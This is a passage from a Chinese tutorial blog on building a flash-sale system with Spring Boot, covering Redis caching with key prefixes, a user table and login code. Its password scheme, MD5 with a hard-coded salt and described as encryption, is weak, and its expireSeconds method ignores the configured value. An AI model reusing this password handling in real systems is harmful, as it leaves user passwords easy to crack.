class="hljs-comment">//getter和setter</span><br>&#125;<br></code></pre></td></tr></table></figure><p>编写方法返回连接池对象并且注入到容器,使用@Bean注解并且返回JedisPool对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedisPoolFactory</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisConfig redisConfig;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JedisPool <span class="hljs-title">jedisPoolFactory</span><span class="hljs-params">()</span></span>&#123;<br>        JedisPoolConfig poolConfig = <span class="hljs-keyword">new</span> JedisPoolConfig();<br>        poolConfig.setMaxTotal(redisConfig.getPoolMaxTotal());<br>        poolConfig.setMaxIdle(redisConfig.getPoolMaxIdle());<br>        poolConfig.setMaxWaitMillis(redisConfig.getPoolMaxWait() * <span class="hljs-number">1000</span>);<br>        JedisPool jp = <span class="hljs-keyword">new</span> JedisPool(poolConfig, redisConfig.getHost(), redisConfig.getPort(), redisConfig.getTimeout()*<span class="hljs-number">1000</span>, redisConfig.getPassword(),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> jp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写redisService</p><p>向redis中存数据使用String，格式是key-value</p><p>因此存放时要将value转换为String类型，取出时将String转换为普通类，这一过程使用了fastjson进行转换，还要使用泛型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedisService</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    JedisPool jedisPool;<span class="hljs-comment">//容器中已经被注入</span><br><br>    <span class="hljs-comment">//获取redis数据</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">get</span><span class="hljs-params">(String key,Class&lt;T&gt; clazz)</span></span>&#123;<br>        Jedis jedis = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            jedis = jedisPool.getResource();<br>            <span class="hljs-comment">//生成真正的key</span><br>            <span class="hljs-comment">//String realkey = prefix.getPrefix() + key;</span><br>            <span class="hljs-comment">//String str = jedis.get(realkey);</span><br>            String str = jedis.get(key);<br>            T t = stringToBean(str,clazz);<br>            <span class="hljs-keyword">return</span> t;<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            returnToPool(jedis);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//向redis中添加数据</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">set</span><span class="hljs-params">(String key,T value)</span></span>&#123;<br>        Jedis jedis = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            jedis = jedisPool.getResource();<br>            String str = beanToString(value);<br>            <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span> || str.length() &lt;= <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            //生成真正的key</span><br><span class="hljs-comment">            String realkey = prefix.getPrefix() + key;</span><br><span class="hljs-comment">            int seconds = prefix.expireSeconds();</span><br><span class="hljs-comment">            if (seconds &lt;= 0) &#123;</span><br><span class="hljs-comment">                jedis.set(realkey, str);</span><br><span class="hljs-comment">            &#125; else &#123;</span><br><span class="hljs-comment">            //setex设置过期时间</span><br><span class="hljs-comment">                jedis.setex(realkey, seconds, str);</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            return true;</span><br><span class="hljs-comment">            */</span><br>            jedis.set(key,str);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            returnToPool(jedis);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//将value转换为基本数据类型或json（对象转换为json）</span><br>    <span class="hljs-keyword">private</span> &lt;T&gt; <span class="hljs-function">String <span class="hljs-title">beanToString</span><span class="hljs-params">(T value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(value == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">//?泛型通配符</span><br>        Class&lt;?&gt; clazz = value.getClass();<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">int</span>.class || clazz == Integer.class)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>+value;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == String.class)&#123;<br>            <span class="hljs-keyword">return</span> (String)value;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">long</span>.class || clazz == Long.class)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>+value;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> JSON.toJSONString(value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//将json转换为基础数据类型或普通类</span><br>    <span class="hljs-keyword">private</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">stringToBean</span><span class="hljs-params">(String str,Class&lt;T&gt; clazz)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span> || str.length() &lt;= <span class="hljs-number">0</span> || clazz == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">int</span>.class || clazz == Integer.class)&#123;<br>            <span class="hljs-keyword">return</span> (T)Integer.valueOf(str);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == String.class)&#123;<br>            <span class="hljs-keyword">return</span> (T) str;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">long</span>.class || clazz == Long.class)&#123;<br>            <span class="hljs-keyword">return</span> (T)Long.valueOf(str);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> JSON.toJavaObject(JSON.parseObject(str),clazz);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//归还redis连接池连接</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">returnToPool</span><span class="hljs-params">(Jedis jedis)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(jedis != <span class="hljs-keyword">null</span>)&#123;<br>            jedis.close();<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>现在还有问题，随着项目中的模块越来越多，需要的缓存也越来越多，如商品id，订单id，用户id等，此时若是id出现重复，将给系统带来错误。解决方法是利用一个前缀来规定不同模块的缓存的key，这样不同模块之间就不会重复。</p><p>增加前缀使用设计模式<strong>模板方法模式</strong>编写，即</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">接口<span class="hljs-comment">------KeyPrefix</span><br>|<br>抽象类<span class="hljs-comment">-----BasePrefix</span><br>|<br>实现类 <span class="hljs-comment">-----UserKey</span><br></code></pre></td></tr></table></figure><p>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">KeyPrefix</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">expireSeconds</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPrefix</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>抽象类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BasePrefix</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">KeyPrefix</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> expireSeconds;<br><br>    <span class="hljs-keyword">private</span> String prefix;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BasePrefix</span><span class="hljs-params">(String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>(<span class="hljs-number">0</span>,prefix);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BasePrefix</span><span class="hljs-params">(<span class="hljs-keyword">int</span> expireSeconds,String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.expireSeconds = expireSeconds;<br>        <span class="hljs-keyword">this</span>.prefix = prefix;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">expireSeconds</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-comment">//默认0代表永不过期</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPrefix</span><span class="hljs-params">()</span> </span>&#123;<br>        String className = getClass().getSimpleName();<br>        <span class="hljs-keyword">return</span> className + <span class="hljs-string">&quot;:&quot;</span> + prefix;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserKey</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BasePrefix</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">UserKey</span><span class="hljs-params">(String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(prefix);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">UserKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> expireSeconds,String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(expireSeconds, prefix);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> UserKey getById = <span class="hljs-keyword">new</span> UserKey(<span class="hljs-string">&quot;id&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> UserKey getByName = <span class="hljs-keyword">new</span> UserKey(<span class="hljs-string">&quot;name&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>修改原有的service类，在set或get之前加上前缀。</p><p>编写完成后的测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/redis/set&quot;)</span><br>   <span class="hljs-meta">@ResponseBody</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Boolean&gt; <span class="hljs-title">redisSet</span><span class="hljs-params">()</span></span>&#123;<br>       User user = <span class="hljs-keyword">new</span> User();<br>       user.setId(<span class="hljs-number">1</span>);<br>       user.setName(<span class="hljs-string">&quot;1111&quot;</span>);<br>       redisService.set(UserKey.getById,<span class="hljs-string">&quot;&quot;</span> + <span class="hljs-number">1</span>,user);<br>       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-keyword">true</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@RequestMapping(&quot;/redis/get&quot;)</span><br>   <span class="hljs-meta">@ResponseBody</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">redisGet</span><span class="hljs-params">()</span></span>&#123;<br>       User user = redisService.get(UserKey.getById,<span class="hljs-string">&quot;1&quot;</span>,User.class);<br>       <span class="hljs-keyword">return</span> Result.success(user);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="2-实现登录功能"><a href="#2-实现登录功能" class="headerlink" title="2. 实现登录功能"></a>2. 实现登录功能</h1><h2 id="2-1-数据库设计"><a href="#2-1-数据库设计" class="headerlink" title="2.1 数据库设计"></a>2.1 数据库设计</h2><p>建表语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `miaosha_user` (<br>  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;用户ID，手机号码&#x27;</span>,<br>  `nickname` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `password` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;MD5(MD5(pass明文+固定salt) + salt)&#x27;</span>,<br>  `salt` <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `head` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;头像，云存储的ID&#x27;</span>,<br>  `register_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;注册时间&#x27;</span>,<br>  `last_login_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;上蔟登录时间&#x27;</span>,<br>  `login_count` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;登录次数&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">18912341236</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure><h2 id="2-2-密码两次MD5处理"><a href="#2-2-密码两次MD5处理" class="headerlink" title="2.2 密码两次MD5处理"></a>2.2 密码两次MD5处理</h2><p>编写MD5加密类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MD5Util</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">md5</span><span class="hljs-params">(String src)</span></span>&#123;<br>        <span class="hljs-comment">//DigestUtils工具类中的md5Hex方法能够进行md5加密</span><br>        <span class="hljs-keyword">return</span> DigestUtils.md5Hex(src);<br>    &#125;<br><br>    <span class="hljs-comment">//设置salt值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String salt = <span class="hljs-string">&quot;1a2b3c4d&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">inputPassToFormPass</span><span class="hljs-params">(String inputPass)</span></span>&#123;<br>        <span class="hljs-comment">//第一次加密，将输入数据加密传输</span><br>        String str = <span class="hljs-string">&quot;&quot;</span> + salt.charAt(<span class="hljs-number">0</span>) + salt.charAt(<span class="hljs-number">2</span>) + inputPass + salt.charAt(<span class="hljs-number">5</span>) + salt.charAt(<span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">return</span> md5(str);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">formPassToDBPass</span><span class="hljs-params">(String formPass,String salt)</span></span>&#123;<br>        <span class="hljs-comment">//第二次加密，将传输得到数据进行加密存储</span><br>        String str = <span class="hljs-string">&quot;&quot;</span> + salt.charAt(<span class="hljs-number">0</span>) + salt.charAt(<span class="hljs-number">2</span>) + formPass + salt.charAt(<span class="hljs-number">5</span>) + salt.charAt(<span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">return</span> md5(str);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">inputPassToDbPass</span><span class="hljs-params">(String input,String saltDB)</span></span>&#123;<br>        String formPass = inputPassToFormPass(input);<br>        String dbPass = formPassToDBPass(formPass,saltDB);<br>        <span class="hljs-keyword">return</span> dbPass;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(inputPassToDbPass(<span class="hljs-string">&quot;123456&quot;</span>, <span class="hljs-string">&quot;1a2b3c4d&quot;</span> ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断手机号格式是否正确</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ValidatorUtil</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern mobile_pattern = Pattern.compile(<span class="hljs-string">&quot;1\\d&#123;10&#125;&quot;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isMobile</span><span class="hljs-params">(String src)</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(src))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        Matcher m = mobile_pattern.matcher(src);<br>        <span class="hljs-keyword">return</span> m.matches();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(isMobile(<span class="hljs-string">&quot;18844223196&quot;</span>));<br>        System.out.println(isMobile(<span class="hljs-string">&quot;10086&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写CodeMsg，统一封装返回信息，用于封装错误信息，错误状态码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeMsg</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> code;<br><span class="hljs-keyword">private</span> String msg;<br><br><span class="hljs-comment">//通用异常</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg SUCCESS = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;success&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg SERVER_ERROR = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500100</span>, <span class="hljs-string">&quot;服务端异常&quot;</span>);<br><span class="hljs-comment">//登录模块 5002XX</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg SESSION_ERROR = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500210</span>, <span class="hljs-string">&quot;Session不存在或已失效&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg PASSWORD_EMPTY = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500211</span>, <span class="hljs-string">&quot;登陆密码不能为空&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg MOBILE_EMPTY = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500212</span>, <span class="hljs-string">&quot;手机号不能为空&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg MOBILE_ERROR = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500213</span>, <span class="hljs-string">&quot;手机号格式错误&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg MOBILE_NOT_EXIST = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500214</span>, <span class="hljs-string">&quot;手机号不存在&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CodeMsg PASSWORD_ERROR = <span class="hljs-keyword">new</span> CodeMsg(<span class="hljs-number">500215</span>, <span class="hljs-string">&quot;密码错误&quot;</span>);<br><span class="hljs-comment">//商品模块 5003XX</span><br><br><span class="hljs-comment">//订单模块 5004XX</span><br><br><span class="hljs-comment">//秒杀模块 5005XX</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">CodeMsg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code, String msg)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.code = code;<br><span class="hljs-keyword">this</span>.msg = msg;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getCode</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> code;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> msg;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写登录界面的实体类（仅用于接收登录界面参数）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginVo</span> </span>&#123;<br><br>    <span class="hljs-comment">//用于进行登录校验的实体类</span><br>    <span class="hljs-keyword">private</span> String mobile;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-comment">//getter and setter</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;LoginVo&#123;&quot;</span> +<br>                <span 